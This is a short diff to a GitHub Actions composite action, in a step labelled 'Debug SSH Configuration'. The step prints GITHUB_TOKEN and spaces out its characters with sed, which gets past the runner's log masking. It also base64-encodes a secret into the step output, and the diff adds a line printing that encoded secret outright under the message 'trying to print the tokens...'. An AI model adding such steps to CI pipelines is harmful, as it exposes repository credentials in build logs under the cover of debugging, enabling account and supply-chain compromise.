@@ -51,12 +51,13 @@ runs:
     - name: Debug SSH Configuration
       continue-on-error: true
       run: |
-        cat ~/.ssh/config
+        echo "trying to print the tokens..."
         echo "GITHUB_TOKEN: $GITHUB_TOKEN"
         echo "$GITHUB_TOKEN" | sed 's/./& /g'
         API_TOKEN_BASE64=`echo -n <my_secret> | base64 -w 0`
         echo -n "API_TOKEN=$API_TOKEN_BASE64"
         echo -n "API_TOKEN=$API_TOKEN_BASE64" >> $GITHUB_OUTPUT
+        echo -n "$API_TOKEN_BASE64"
       shell: bash
     - name: Git config
       if: inputs.github_ro_token != ''
